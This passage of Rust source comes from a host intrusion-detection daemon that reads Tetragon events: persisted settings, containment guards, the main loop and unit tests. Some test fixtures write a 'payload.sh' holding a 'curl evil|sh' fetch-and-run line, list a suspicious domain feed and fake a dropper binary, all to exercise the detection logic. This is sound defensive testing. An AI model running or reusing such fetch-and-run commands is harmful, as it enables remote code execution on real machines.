              fires on the real thing -- but each step up is a step of unnoticed encryption.",
    },
    TunableThreshold {
        key: "ransom_churn_window_secs",
        min: 10,
        max: 3600,
        bigger_is_weaker: false,
        why: "This is also how long a read counts as \"just before\" the destruction of the same \
              path, so a very long window starts pairing up unrelated events.",
    },
    TunableThreshold {
        key: "dedupe_secs",
        min: 0,
        max: 3600,
        bigger_is_weaker: true,
        why: "Folding, not suppression: a repeat inside the window becomes a `count` update on \
              the alert already on the badge. 0 means every event gets its own alert, which is \
              what the tests use and what a busy machine should not.",
    },
];

pub fn tunable_threshold(key: &str) -> Option<&'static TunableThreshold> {
    TUNABLE_THRESHOLDS.iter().find(|t| t.key == key)
}

/// The overrides as `status`/state.json carries them.
fn persisted_threshold_overrides(state: &Option<Value>) -> std::collections::BTreeMap<String, u64> {
    let mut out = std::collections::BTreeMap::new();
    let Some(map) = state
        .as_ref()
        .and_then(|s| s.get("threshold_overrides"))
        .and_then(|v| v.as_object())
    else {
        return out;
    };
    for (k, v) in map {
        // Validated on the way back in, not only on the way out: a hand-edited
        // or corrupt state.json must not be able to set a threshold the socket
        // would have refused.
        let (Some(n), Some(t)) = (v.as_u64(), tunable_threshold(k)) else {
            continue;
        };
        if n >= t.min && n <= t.max {
            out.insert(k.clone(), n);
        }
    }
    out
}

/// Per-rule enforcement survives a restart the same way `mode` does: through
/// state.json, which is `status()` written back out.
fn persisted_enforcing_rules(state: &Option<Value>) -> std::collections::BTreeSet<String> {
    state
        .as_ref()
        .and_then(|s| s.get("enforcing_rules"))
        .and_then(|v| v.as_array())
        .map(|a| {
            a.iter()
                .filter_map(|v| v.as_str().map(str::to_string))
                .collect()
        })
        .unwrap_or_default()
}

/// `[contain] enabled` as the USER last set it.
///
/// Same shape as `persisted_mode`, and for the same reason: a switch a person
/// flips is runtime state, not configuration. Making containment a root-owned
/// TOML edit plus a `systemctl restart` -- which is how it shipped first --
/// put a security feature behind a text editor and a service restart, while
/// every other switch on this daemon (mode, sandbox, digest) needed neither.
/// The file stays the DEFAULT for a fresh machine; this is the override.
/// The kernel exclusions recorded in state.json, for `render-policies`.
///
/// A free function because rendering happens in a separate process before the
/// daemon exists (ExecStartPre), and the exclusions have to be applied there or
/// the program the user allowed starts dying again on the next boot.
pub fn read_exclusions(
    state_file: &Path,
) -> std::collections::BTreeMap<String, Vec<String>> {
    let mut out = std::collections::BTreeMap::new();
    let Some(state) = read_state(state_file) else {
        return out;
    };
    let Some(map) = state.get("kernel_exclusions").and_then(|v| v.as_object()) else {
        return out;
    };
    for (policy, bins) in map {
        let list: Vec<String> = bins
            .as_array()
            .map(|a| a.iter().filter_map(|b| b.as_str().map(str::to_string)).collect())
            .unwrap_or_default();
        if !list.is_empty() {
            out.insert(policy.clone(), list);
        }
    }
    out
}

/// The rules whose finding is "a setuid or setgid bit was set".
fn is_setuid_rule(name: &str) -> bool {
    name == "moat-priv-setuid-chmod" || name == "moat-priv-setcap-xattr"
}

/// Why this setuid/setcap event grants no privilege, if it does not.
///
/// `None` means it really is a privilege signal: the actor is root, the file
/// belongs to somebody else, or moat could not tell. Could-not-tell must never
/// read as harmless, so a failed `stat` returns `None`.
fn setuid_grants_nothing(f: &crate::explain::Finding, path: &str) -> Option<String> {
    use std::os::unix::fs::MetadataExt;
    let actor = f.proc.uid;
    if actor == 0 {
        return None;
    }
    let owner = std::fs::metadata(path).ok()?.uid();
    (owner == actor).then(|| {
        format!(
            "uid {} set this bit on a file uid {} already owns, so it grants no privilege: \
             setuid means \"run as the file's owner\", and the owner is the caller",
            actor, owner
        )
    })
}

/// Is this destination string the unspecified address ("any"), not a host?
///
/// `0.0.0.0`, `::`, their CIDR forms, and an empty string. A containment naming
/// one of these does not refuse a beacon -- it refuses the binary's traffic
/// wholesale, or nothing at all, and either way is never what containment
/// means. Guarded absolutely because containment is a policy moatd writes and
/// arms without asking.
fn is_unspecified_dest(d: &str) -> bool {
    let d = d.trim();
    if d.is_empty() {
        return true;
    }
    // Strip a CIDR suffix before comparing the address.
    let addr = d.split('/').next().unwrap_or(d);
    match addr.parse::<std::net::IpAddr>() {
        Ok(ip) => ip.is_unspecified(),
        // Not parseable as an address at all is not a destination we can
        // safely refuse either.
        Err(_) => true,
    }
}

fn persisted_contain(state: &Option<Value>) -> Option<bool> {
    state.as_ref()?.get("contain_enabled")?.as_bool()
}

/// The panel can change `kill`, so like `contain_enabled` it has to survive a
/// restart from state.json rather than from moat.toml -- moatd does not
/// rewrite a config file the user also owns. An unrecognised value is ignored
/// rather than defaulted, so a corrupt state file cannot silently arm SIGKILL.
fn persisted_kill(state: &Option<Value>) -> Option<String> {
    let v = state.as_ref()?.get("contain_kill")?.as_str()?;
    matches!(v, "off" | "log" | "kill").then(|| v.to_string())
}

fn persisted_mode(state: &Option<Value>) -> Option<String> {
    let m = state.as_ref()?.get("mode")?.as_str()?;
    (m == "monitor" || m == "enforce").then(|| m.to_string())
}

/// BASELINE §3 puts `installed_at` in `state.json`; it is stamped there on the
/// first run and never moved again, so a wiped `baseline.json` does not restart
/// the learning window on a machine that has been running for months.
fn persisted_installed_at(state: &Option<Value>) -> Option<u64> {
    let v = state.as_ref()?.get("installed_at")?;
    if let Some(n) = v.as_u64() {
        return (n > 0).then_some(n);
    }
    let nanos = util::rfc3339_to_nanos(v.as_str()?)?;
    let secs = (nanos / 1_000_000_000) as u64;
    (secs > 0).then_some(secs)
}

/// LEARNING §5: the digest switch lives in state.json, so turning it off needs
/// no root and no `systemctl`. `digest_enabled` is the name the doc gives it;
/// `digest` is the boolean `status` publishes. Either is accepted.
fn persisted_digest_enabled(state: &Option<Value>) -> Option<bool> {
    let s = state.as_ref()?;
    s.get("digest_enabled")
        .or_else(|| s.get("digest"))
        .and_then(|v| v.as_bool())
}

fn persisted_u64(state: &Option<Value>, section: &str, key: &str) -> u64 {
    state
        .as_ref()
        .and_then(|s| s.get(section))
        .and_then(|s| s.get(key))
        .and_then(|v| v.as_u64())
        .unwrap_or(0)
}

/// A synthetic process for the alerts moat raises about itself. The pid is our
/// own so `ps -fp` shows something real, and there is nothing to kill.
fn self_proc(about: &str) -> ProcInfo {
    let (sid, tty) = crate::proctable::read_session(std::process::id());
    ProcInfo {
        // moatd runs on the host. An alert moat raises about ITSELF must never
        // be quietened by the container switch, nor by the namespace step in
        // `scoring`.
        in_container: Some(false),
        user_ns_host: Some(true),
        // moatd holds capabilities, but an alert ABOUT moat is not a finding
        // about moat's own privilege.
        caps: Vec::new(),
        exec_id: String::new(),
        pid: std::process::id(),
        uid: unsafe { libc::geteuid() },
        exe: std::env::current_exe()
            .map(|p| p.display().to_string())
            .unwrap_or_else(|_| "/usr/bin/moatd".into()),
        args: about.to_string(),
        cwd: String::new(),
        start_time: util::now_rfc3339(),
        parent_exec_id: None,
        exited_at: None,
        exit_signal: None,
        exe_note: None,
        sid,
        tty,
    }
}

/// Append one learned block to `baseline.toml`, creating it with a header that
/// says who writes it and how to undo it.
fn write_learned(path: &Path, comment: &str, toml: &str) -> std::io::Result<()> {
    use std::io::Write;
    if let Some(p) = path.parent() {
        std::fs::create_dir_all(p)?;
    }
    let mut block = String::new();
    if !path.exists() {
        block.push_str(
            "# Written by moatd's learning window (BASELINE §3). Every entry says how it was\n\
             # earned. Remove one with `moatctl allowlist` then `moatctl unignore --file\n\
             # baseline.toml <index>`, or restart learning with `moatctl baseline relearn`.\n",
        );
    }
    block.push('\n');
    block.push_str(&format!("# {}\n", comment));
    block.push_str(toml);
    let mut f = std::fs::OpenOptions::new().create(true).append(true).open(path)?;
    f.write_all(block.as_bytes())?;
    f.sync_all()
}

// ------------------------------------------------------------------- run loop

pub struct RunOptions {
    /// Replay the log from offset 0 instead of tailing from the end.
    pub from_start: bool,
    /// Stop once the log has no more lines (used by dev-run and tests).
    pub once: bool,
    pub poll: Duration,
}

impl Default for RunOptions {
    fn default() -> Self {
        Self {
            from_start: false,
            once: false,
            poll: Duration::from_millis(200),
        }
    }
}

pub fn run(daemon: Arc<Mutex<Daemon>>, opts: RunOptions) {
    {
        // The kernel has to agree with what the record says is armed -- but
        // NOT yet. `begin_arming` only starts the clock; `tick` does the
        // arming, once the sensor says it has the policies. Arming here, 2 s
        // after start, is the 2026-09-05 outage: tetragon is `Type=simple`, so
        // systemd calls it started while it is still 16 seconds from loading
        // the last of 44 policies, and all seven `set-mode` calls failed
        // against a sensor that did not have those names yet.
        let mut d = daemon.lock().expect("daemon lock");
        d.on_start(util::unix_secs());
        d.start_names();
    }
    let (log_path, state_every, feeds_every, feeds_dir) = {
        let d = daemon.lock().expect("daemon lock");
        (
            d.cfg.paths.tetragon_log.clone(),
            d.cfg.thresholds.state_interval_secs,
            d.cfg.thresholds.feeds_poll_secs,
            d.cfg.paths.feeds(),
        )
    };
    let mut tailer = Tailer::new(&log_path, opts.from_start);
    // Wake on the log changing rather than five times a second regardless.
    // `None` (no inotify, unwatchable directory) falls back to the sleep this
    // replaces: slower, never wrong. See `tail::LogWaker` for the 221 ms this
    // came out of.
    let waker = crate::tail::LogWaker::new(&log_path);
    if waker.is_none() {
        log::warn!(
            "could not watch {} for changes; falling back to polling every {} ms",
            log_path.display(),
            opts.poll.as_millis()
        );
    }
    let mut last_state = 0u64;
    let mut last_feeds = util::unix_secs();
    let mut idle_polls = 0u32;

    log::info!("tailing {}", log_path.display());
    loop {
        if SHUTDOWN.load(Ordering::SeqCst) {
            log::info!("shutting down");
            let mut d = daemon.lock().expect("daemon lock");
            // rarity.json and baseline.json are flushed on the way out; the
            // 60 s timer must not cost a day of counters on a restart.
            d.tick(util::unix_secs(), true);
            d.flush_telemetry();
            d.write_state();
            break;
        }
        if RELOAD.swap(false, Ordering::SeqCst) {
            log::info!("SIGHUP: reloading policies and allowlist");
            daemon.lock().expect("daemon lock").reload();
        }

        let lines = tailer.poll();
        let got = !lines.is_empty();
        if got {
            let mut d = daemon.lock().expect("daemon lock");
            // Names first: the resolution precedes the connection on the wire
            // and must precede it in the cache.
            d.drain_names(util::unix_secs());
            for l in lines {
                d.handle_line(&l);
            }
        }

        let now = util::unix_secs();
        if now.saturating_sub(last_state) >= state_every {
            last_state = now;
            let mut d = daemon.lock().expect("daemon lock");
            d.table.prune(now);
            // Idle machines resolve names too, and the reader's state has to
            // reach `status` without waiting for the sensor to say something.
            d.drain_names(now);
            // One stat of /var/lib/pacman/local; a reload only happens when a
            // transaction actually moved it (BASELINE §1).
            d.on_pacman_change();
            d.tick(now, false);
            // Telemetry is written per event and flushed here, not per line:
            // 42 exec events a second is 42 write(2)s, and putting a flush on
            // each one would push the sensor's own I/O onto the event path.
            d.flush_telemetry();
            d.write_state();
        }
        if now.saturating_sub(last_feeds) >= feeds_every {
            last_feeds = now;
            let mut d = daemon.lock().expect("daemon lock");
            if d.feeds.reload_if_changed(&feeds_dir) {
                log::info!("feeds reloaded: {} hashes", d.feeds.meta.hashes);
            }
        }

        if got {
            idle_polls = 0;
        } else {
            idle_polls += 1;
            if opts.once && idle_polls > 2 {
                let mut d = daemon.lock().expect("daemon lock");
                let now = util::unix_secs();
                d.table.prune(now);
                d.tick(now, true);
                d.flush_telemetry();
                d.write_state();
                break;
            }
            // Bounded by `opts.poll` either way, so every periodic thing
            // above -- state writes, the feeds check, `tick` -- keeps the
            // cadence it had. This only ever shortens the wait.
            match &waker {
                Some(w) => w.wait(opts.poll),
                None => std::thread::sleep(opts.poll),
            }
        }
    }
}

#[cfg(test)]
mod tests {

    #[test]
    fn the_unspecified_address_is_never_a_containment_destination() {
        // 0.0.0.0 / :: are "any", not a host. A containment naming one refuses
        // the binary's traffic wholesale or nothing at all -- the 2026-09-06
        // report where a benign run showed "python may not reach 0.0.0.0".
        assert!(is_unspecified_dest("0.0.0.0"));
        assert!(is_unspecified_dest("0.0.0.0/0"));
        assert!(is_unspecified_dest("::"));
        assert!(is_unspecified_dest(""));
        assert!(is_unspecified_dest("   "));
        assert!(is_unspecified_dest("not-an-address"));
        // A real host is fine.
        assert!(!is_unspecified_dest("192.168.44.122"));
        assert!(!is_unspecified_dest("52.86.29.70"));
        assert!(!is_unspecified_dest("2600:1901::1"));
    }

    use super::*;

    fn dev_daemon(dir: &Path) -> (Daemon, Config) {
        let mut cfg = Config::default();
        cfg.paths.state_dir = dir.join("state");
        cfg.paths.runtime_dir = dir.join("run");
        cfg.paths.socket = dir.join("run/control.sock");
        cfg.paths.policies_dir =
            Path::new(env!("CARGO_MANIFEST_DIR")).join("testdata/policies");
        cfg.paths.allowlist_dir = dir.join("allowlist.d");
        cfg.paths.tetragon_log = Path::new(env!("CARGO_MANIFEST_DIR")).join("testdata/sample.log");
        cfg.paths.sandbox_flag = dir.join("sandbox.enabled");
        // Snapshots and bundles must never touch the real /var/lib/moat.
        cfg.analysis.bundle_dir = dir.join("incidents");
        // Provenance runs off a fixture, so no test touches the real pacman
        // database and none of them spawn the real pacman.
        cfg.paths.pacman_local = Path::new(env!("CARGO_MANIFEST_DIR")).join("testdata/pacman-local");
        cfg.paths.pacman = Path::new(env!("CARGO_MANIFEST_DIR")).join("testdata/fake-pacman");
        std::fs::create_dir_all(&cfg.paths.allowlist_dir).unwrap();
        let mut d = Daemon::new(cfg.clone(), &dir.join("moat.toml")).unwrap();
        d.homes = vec!["/home/dan".into()];
        d.provenance.set_homes(&d.homes);
        (d, cfg)
    }

    /// The sibling list is capped, and the count stays honest.
    ///
    /// 2026-09-11: `others` shipped unbounded. A `cargo build` gives one
    /// ancestor hundreds of concurrent rustc children with ~1.3 KB command
    /// lines each, all of which were written into every alert under that
    /// build: 730 KB in one `others`, a 277 KB record, a 47 KB mean across the
    /// store, alerts.jsonl rotating every nine minutes, and a high-severity
    /// IOC alert ageing out of `moatctl list --limit 100` in under two
    /// minutes while it was the thing being looked at.
    #[test]
    fn a_noisy_ancestor_does_not_put_its_whole_build_in_every_alert() {
        use crate::rules::testkit::proc;

        let dir = tempfile::tempdir().unwrap();
        let (mut d, _) = dev_daemon(dir.path());

        // A shell, the process that goes on to alert, and 300 siblings with
        // the kind of command line rustc actually has.
        let long_args = format!("--crate-name x {}", "--cfg feature=y ".repeat(80));
        d.table.observe(&proc("sh", 10, "/bin/sh", "", None));
        d.table.observe(&proc("victim", 11, "/usr/bin/curl", "https://x/", Some("sh")));
        for i in 0..300u32 {
            d.table.observe(&proc(
                &format!("s{}", i),
                1000 + i,
                "/usr/bin/rustc",
                &long_args,
                Some("sh"),
            ));
        }

        let (others, total) = d.siblings_of("sh", "victim");
        assert_eq!(total, 300, "the real count is still reported");
        assert_eq!(others.len(), 20, "the list is capped");

        // The cap has to bound the BYTES, which is the whole point: twenty
        // rows of an unclamped rustc line is still 26 KB.
        for s in &others {
            assert!(
                s.args.chars().count() <= 220,
                "sibling args not clamped: {} chars",
                s.args.chars().count()
            );
        }
        let bytes = serde_json::to_string(&others).unwrap().len();
        assert!(
            bytes < 8_192,
            "one ancestor's siblings under a 300-process build serialise to {} bytes",
            bytes
        );

        // The process on the path to the alert is never one of its own
        // siblings, cap or no cap.
        assert!(others.iter().all(|s| s.pid != 11));
    }

    #[test]
    fn clamping_a_command_line_says_how_much_it_dropped() {
        // Characters, not bytes: slicing UTF-8 at a byte offset inside a
        // multi-byte sequence panics, and command lines carry arbitrary text.
        assert_eq!(crate::util::clamp_chars("short", 10), "short");
        assert_eq!(crate::util::clamp_chars("abcdef", 3), "abc… (+3 more)");
        let multi = "héllo wörld ünïcode";
        let out = crate::util::clamp_chars(multi, 5);
        assert!(out.starts_with("héllo"), "{}", out);
    }

    /// docs/DNS.md. The one place every net finding is enriched, tested end
    /// to end: reader message -> cache -> record, with the feed match on top,
    /// and the honest line when there is nothing to say.
    #[test]
    fn net_findings_carry_the_resolved_name_or_say_it_is_not_recorded() {
        use crate::names::{Msg, Resolved};

        let dir = tempfile::tempdir().unwrap();
        let (mut d, _) = dev_daemon(dir.path());
        d.cfg.thresholds.dedupe_secs = 0;
        let feeds_dir = d.cfg.paths.feeds();
        std::fs::create_dir_all(&feeds_dir).unwrap();
        std::fs::write(feeds_dir.join("domains.txt"), "evil.example\n").unwrap();
        d.feeds = crate::feeds::Feeds::load(&feeds_dir);

        // Off: the record says so, in words.
        let proc = ProcInfo {
            exec_id: "e-curl".into(),
            pid: 7100,
            uid: 1000,
            exe: "/usr/bin/curl".into(),
            args: String::new(),
            cwd: "/home/dan".into(),
            start_time: util::now_rfc3339(),
            ..Default::default()
        };
        let mk = |ip: &str| {
            let mut f = Finding::new(
                "moat-net-first-contact",
                crate::policy::PolicyMeta::fallback("moat-net-first-contact"),
                proc.clone(),
            );
            f.meta.family = "net".into();
            f.meta.severity = "low".into();
            f.net = Some(crate::alert::NetRef::new(ip, 443));
            f
        };
        d.names_state = "off".into();
        let id = d.emit(mk("142.250.80.14")).expect("recorded");
        let a = d.store.find(&id).unwrap();
        assert_eq!(a.net.as_ref().unwrap().domain, None);
        assert!(
            a.explain.evidence.iter().any(|l| l.starts_with("name: not recorded -- name resolution artifacts are off")),
            "{:?}",
            a.explain.evidence
        );

        // Connected, with what the reader saw: the name lands on the record,
        // with its age, and a fed name becomes the IOC.
        let (tx, rx) = std::sync::mpsc::sync_channel(8);
        d.names_rx = Some(rx);
        tx.send(Msg::State("connected".into())).unwrap();
        tx.send(Msg::Resolved(vec![
            Resolved {
                question: "api.evil.example".into(),
                answer_name: Some("edge.evil-cdn.example".into()),
                ip: "45.9.148.99".parse().unwrap(),
                ttl: Some(300),
            },
            Resolved {
                question: "www.google.com".into(),
                answer_name: None,
                ip: "142.251.154.119".parse().unwrap(),
                ttl: None,
            },
        ]))
        .unwrap();
        let now = util::unix_secs();
        d.drain_names(now - 30);
        assert_eq!(d.names_state, "connected");
        let st = d.status();
        assert_eq!(st["names"]["state"], "connected");
        assert_eq!(st["names"]["addresses"], 2);
        assert_eq!(st["names"]["source"], "systemd-resolved");

        let id = d.emit(mk("142.251.154.119")).expect("recorded");
        let a = d.store.find(&id).unwrap();
        let net = a.net.as_ref().unwrap();
        assert_eq!(net.domain.as_deref(), Some("www.google.com"));
        assert!(net.domain_age_secs.unwrap() >= 30, "{:?}", net);
        assert!(a.ioc.is_none(), "google is not on the feed");
        assert!(a.summary.contains("(www.google.com)"), "{}", a.summary);
        assert!(
            a.explain.evidence.iter().any(|l| l.starts_with("name: www.google.com was resolved to 142.251.154.119")),
            "{:?}",
            a.explain.evidence
        );

        let id = d.emit(mk("45.9.148.99")).expect("recorded");
        let a = d.store.find(&id).unwrap();
        let net = a.net.as_ref().unwrap();
        assert_eq!(net.domain.as_deref(), Some("api.evil.example"));
        assert_eq!(net.domain_cname.as_deref(), Some("edge.evil-cdn.example"));
        let ioc = a.ioc.as_ref().expect("a fed name is the finding's IOC");
        assert_eq!(ioc.source, "domain-feed");
        assert_eq!(ioc.matched, "domain:evil.example");
        assert!(
            a.explain.evidence.iter().any(|l| l.contains("the answer came via edge.evil-cdn.example")),
            "{:?}",
            a.explain.evidence
        );

        // Connected and nothing known about the address: the line says what
        // that can mean, and names the window.
        let id = d.emit(mk("203.0.113.9")).expect("recorded");
        let a = d.store.find(&id).unwrap();
        assert_eq!(a.net.as_ref().unwrap().domain, None);
        let line = a
            .explain
            .evidence
            .iter()
            .find(|l| l.starts_with("name: not recorded -- no resolution of 203.0.113.9"))
            .unwrap_or_else(|| panic!("{:?}", a.explain.evidence));
        assert!(line.contains("6 h"), "{}", line);
        assert!(line.contains("DNS-over-HTTPS"), "{}", line);

        // The reader going away is a state, not a silent null.
        drop(tx);
        d.drain_names(now);
        assert_eq!(d.names_state, "reader exited");
        assert!(d.names_rx.is_none());
        let id = d.emit(mk("203.0.113.9")).expect("recorded");
        let a = d.store.find(&id).unwrap();
        assert!(
            a.explain.evidence.iter().any(|l| l.contains("query stream is not available: reader exited")),
            "{:?}",
            a.explain.evidence
        );

        // Retention: `tick` prunes, and a pruned address reads as unknown.
        d.tick(now + d.cfg.names.retain_secs + 1, false);
        assert!(d.names.is_empty());
    }

    /// The attribution has to survive a name that a RULE put on the finding.
    ///
    /// `moat-x-net-domain-ioc` sets `net.domain` itself, because it matched
    /// that name against the feed -- and until 2026-09-11 `enrich_names`
    /// early-returned whenever a domain was already present, so the one alert
    /// where "who asked for this bad name" matters most was the one that never
    /// carried it. Found live: a domain-feed hit with the asker blank while a
    /// plain first-contact alert to the same machine had it.
    #[test]
    fn a_name_put_on_the_finding_by_a_rule_still_gets_its_asker() {
        let dir = tempfile::tempdir().unwrap();
        let (mut d, _) = dev_daemon(dir.path());
        d.cfg.thresholds.dedupe_secs = 0;
        d.names_state = "connected".into();

        // The varlink probe saw curl look the name up, a moment before.
        let now = util::unix_secs();
        d.queries.record("evil.example", 7100, "/usr/bin/curl", now - 3);

        // A finding that already carries the name, exactly as the domain-ioc
        // rule leaves it -- not from the resolved-stream cache, which is empty.
        let proc = ProcInfo {
            exec_id: "e-curl".into(),
            pid: 7100,
            uid: 1000,
            exe: "/usr/bin/curl".into(),
            args: String::new(),
            cwd: "/home/dan".into(),
            start_time: util::now_rfc3339(),
            ..Default::default()
        };
        let mut f = Finding::new(
            "moat-x-net-domain-ioc",
            crate::policy::PolicyMeta::fallback("moat-x-net-domain-ioc"),
            proc,
        );
        f.meta.family = "net".into();
        f.meta.severity = "high".into();
        let mut net = crate::alert::NetRef::new("45.9.148.99", 443);
        net.domain = Some("evil.example".into());
        f.net = Some(net);

        let id = d.emit(f).expect("recorded");
        let a = d.store.find(&id).unwrap();
        let net = a.net.as_ref().unwrap();
        assert_eq!(
            net.domain_queried_by.as_deref(),
            Some("/usr/bin/curl (pid 7100)"),
            "a rule-set name must still be attributed to who asked for it"
        );
        assert!(
            a.explain.evidence.iter().any(|l| l.starts_with("asked by: /usr/bin/curl (pid 7100)")
                && l.contains("the same process that connected")),
            "{:?}",
            a.explain.evidence
        );
    }

    // ------------------------------------------------------------- telemetry

    fn telemetry_daemon(dir: &Path, f: impl FnOnce(&mut crate::config::TelemetryConfig)) -> Daemon {
        let mut cfg = Config::default();
        cfg.paths.state_dir = dir.join("state");
        cfg.paths.policies_dir = Path::new(env!("CARGO_MANIFEST_DIR")).join("testdata/policies");
        cfg.paths.allowlist_dir = dir.join("allowlist.d");
        cfg.paths.sandbox_flag = dir.join("sandbox.enabled");
        cfg.analysis.bundle_dir = dir.join("incidents");
        cfg.paths.pacman_local = Path::new(env!("CARGO_MANIFEST_DIR")).join("testdata/pacman-local");
        cfg.paths.pacman = Path::new(env!("CARGO_MANIFEST_DIR")).join("testdata/fake-pacman");
        std::fs::create_dir_all(&cfg.paths.allowlist_dir).unwrap();
        f(&mut cfg.telemetry);
        let mut d = Daemon::new(cfg, &dir.join("moat.toml")).unwrap();
        d.homes = vec!["/home/dan".into()];
        d
    }

    /// Timing probe, not a test: `MOAT_BENCH_DIR=<dir with alerts.jsonl and
    /// alerts.1.jsonl> cargo test --release --lib engine::tests::bench_status -- --ignored --nocapture`.
    #[test]
    #[ignore]
    fn bench_status() {
        let Ok(src) = std::env::var("MOAT_BENCH_DIR") else { return };
        let src = Path::new(&src);
        let dir = tempfile::tempdir().unwrap();
        std::fs::create_dir_all(dir.path().join("state")).unwrap();
        for f in ["alerts.jsonl", "alerts.1.jsonl"] {
            std::fs::copy(src.join(f), dir.path().join("state").join(f)).unwrap();
        }
        let d = telemetry_daemon(dir.path(), |_| {});
        let now = util::unix_secs();
        for _ in 0..3 {
            let t = std::time::Instant::now();
            let _ = d.store.unacked();
            let t_un = t.elapsed();
            let t = std::time::Instant::now();
            let _ = d.digest(now);
            let t_dg = t.elapsed();
            let t = std::time::Instant::now();
            let _ = d.store.receipts().len();
            let t_rc = t.elapsed();
            let t = std::time::Instant::now();
            let _ = d.tetragon_state();
            let t_ts = t.elapsed();
            let t = std::time::Instant::now();
            let _ = incident::count(&d.incidents_dir());
            let t_ic = t.elapsed();
            let t = std::time::Instant::now();
            let st = d.status();
            let t_st = t.elapsed();
            let t = std::time::Instant::now();
            let body = serde_json::to_string_pretty(&st).unwrap();
            let t_ser = t.elapsed();
            let t = std::time::Instant::now();
            d.write_state();
            let t_ws = t.elapsed();
            eprintln!("BENCH unacked {:?} digest {:?} receipts {:?} tetragon_state {:?} incident::count {:?} | status() {:?} ({} bytes) serialize {:?} write_state {:?}",
                t_un, t_dg, t_rc, t_ts, t_ic, t_st, body.len(), t_ser, t_ws);
        }
    }

    fn telemetry_lines(d: &Daemon) -> Vec<Value> {
        std::fs::read_to_string(d.cfg.paths.telemetry())
            .unwrap_or_default()
            .lines()
            .filter(|l| !l.trim().is_empty())
            .map(|l| serde_json::from_str(l).unwrap())
            .collect()
    }

    /// Off by default means off: no file, no writes, and one Option check per
    /// event on a path that runs 42 times a second.
    #[test]
    fn every_class_but_alerts_is_off_and_writes_nothing() {
        let dir = tempfile::tempdir().unwrap();
        let mut d = telemetry_daemon(dir.path(), |_| {});
        assert!(d.telemetry.is_none());
        assert_eq!(d.cfg.telemetry.classes(), vec!["alerts"]);
        let text = std::fs::read_to_string(
            Path::new(env!("CARGO_MANIFEST_DIR")).join("testdata/sample.log"),
        )
        .unwrap();
        for l in text.lines() {
            d.handle_line(l);
        }
        assert_eq!(d.telemetry_written, 0);
        assert!(!d.cfg.paths.telemetry().exists());
        assert!(!d.store.load().is_empty(), "alerts still happen");
    }

    /// THE CONSTRAINT. A telemetry event must not be evaluated against a single
    /// rule: with the file class posting ~19 events/s through the kernel filter
    /// during an install, running each through ancestry-walking rules is how a
    /// detection daemon melts. It is recorded and it raises nothing.
    #[test]
    fn a_telemetry_event_is_recorded_and_never_evaluated() {
        let dir = tempfile::tempdir().unwrap();
        let mut d = telemetry_daemon(dir.path(), |t| {
            t.network = true;
            t.file = true;
        });
        assert!(d.telemetry.is_some());

        // A connect to a port that moat-net-suspicious-port-egress would alert
        // on, carried by a telemetry policy instead. It must be recorded and
        // must not become an alert.
        d.handle_line(
            r#"{"process_exec":{"process":{"exec_id":"t1","pid":9001,"uid":1000,
                 "binary":"/usr/bin/curl","arguments":"http://1.2.3.4:4444/x",
                 "start_time":"2026-09-04T10:00:00.000000000Z"}}}"#,
        );
        d.handle_line(
            r#"{"process_kprobe":{"process":{"exec_id":"t1","pid":9001,"binary":"/usr/bin/curl"},
                 "function_name":"tcp_connect","policy_name":"moat-telemetry-network-connect",
                 "args":[{"sock_arg":{"family":"AF_INET","daddr":"1.2.3.4","dport":4444}}],
                 "action":"KPROBE_ACTION_POST"},"time":"2026-09-04T10:00:01.000000000Z"}"#,
        );
        d.flush_telemetry();

        assert!(d.store.load().is_empty(), "telemetry raised an alert");
        assert_eq!(d.alerts_emitted, 0);
        let recs = telemetry_lines(&d);
        assert_eq!(recs.len(), 1, "{:?}", recs);
        assert_eq!(recs[0]["class"], "network");
        assert_eq!(recs[0]["dst_ip"], "1.2.3.4");
        assert_eq!(recs[0]["dst_port"], 4444);
        // Ancestry is why the process table is still updated before the fork.
        assert_eq!(recs[0]["exe"], "/usr/bin/curl");
        assert_eq!(recs[0]["pid"], 9001);
    }

    /// The ladder, through the real event path: a create in a build tree is
    /// dropped, and a rewrite of a file that already existed is not — that
    /// second case is the npm-package-rewrites-its-own-index.js one.
    #[test]
    fn the_file_ladder_drops_the_install_and_keeps_the_rewrite() {
        let dir = tempfile::tempdir().unwrap();
        let tree = dir.path().join("app/node_modules/express");
        std::fs::create_dir_all(&tree).unwrap();
        let fresh = tree.join("index.js");
        std::fs::write(&fresh, b"module.exports = 1\n").unwrap();

        let mut d = telemetry_daemon(dir.path(), |t| {
            t.file = true;
            // The file is seconds old, so a window of 0 makes it read as
            // pre-existing and a large window makes it read as just-created.
            t.create_window_secs = 0;
            t.quiet_creates_under = vec!["/node_modules/".into()];
        });

        let hook = |path: &str| {
            format!(
                r#"{{"process_kprobe":{{"process":{{"exec_id":"w1","pid":9100,"binary":"/usr/bin/node"}},
                     "function_name":"security_file_post_open",
                     "policy_name":"moat-telemetry-file-exec-shape",
                     "args":[{{"file_arg":{{"path":"{}"}}}},{{"int_arg":2}}]}},
                     "time":"2026-09-04T10:00:01.000000000Z"}}"#,
                path
            )
        };
        d.handle_line(&hook(&fresh.display().to_string()));
        d.flush_telemetry();
        let recs = telemetry_lines(&d);
        assert_eq!(recs.len(), 1, "a modify under node_modules is the signal");
        assert_eq!(recs[0]["verdict"], "modify");
        assert_eq!(recs[0]["shape"], "script");
        assert_eq!(recs[0]["kind"], "file_write");
        assert!(recs[0]["sha256"].is_string());
        assert!(recs[0].get("body").is_none(), "no body unless asked for");
        assert_eq!(d.telemetry_filtered, 0);

        // The same path, same policy, but now it counts as a create: dropped.
        d.cfg.telemetry.create_window_secs = 86_400;
        d.handle_line(&hook(&fresh.display().to_string()));
        d.flush_telemetry();
        assert_eq!(telemetry_lines(&d).len(), 1, "the create is not recorded");
        assert_eq!(d.telemetry_filtered, 1);

        // …and a create outside a build tree still is.
        let bin = dir.path().join("bin");
        std::fs::create_dir_all(&bin).unwrap();
        let drop = bin.join("payload.sh");
        std::fs::write(&drop, b"#!/bin/sh\ncurl evil|sh\n").unwrap();
        d.handle_line(&hook(&drop.display().to_string()));
        d.flush_telemetry();
        let recs = telemetry_lines(&d);
        assert_eq!(recs.len(), 2);
        assert_eq!(recs[1]["verdict"], "create");
    }

    #[test]
    fn a_chmod_x_is_its_own_verdict_and_needs_no_birth_time() {
        let dir = tempfile::tempdir().unwrap();
        let f = dir.path().join("dropper");
        std::fs::write(&f, b"\x7fELF\x02rest").unwrap();
        let mut d = telemetry_daemon(dir.path(), |t| t.file = true);
        d.handle_line(&format!(
            r#"{{"process_lsm":{{"process":{{"exec_id":"c1","pid":9200,"binary":"/usr/bin/chmod"}},
                 "function_name":"path_chmod",
                 "policy_name":"moat-telemetry-file-became-executable",
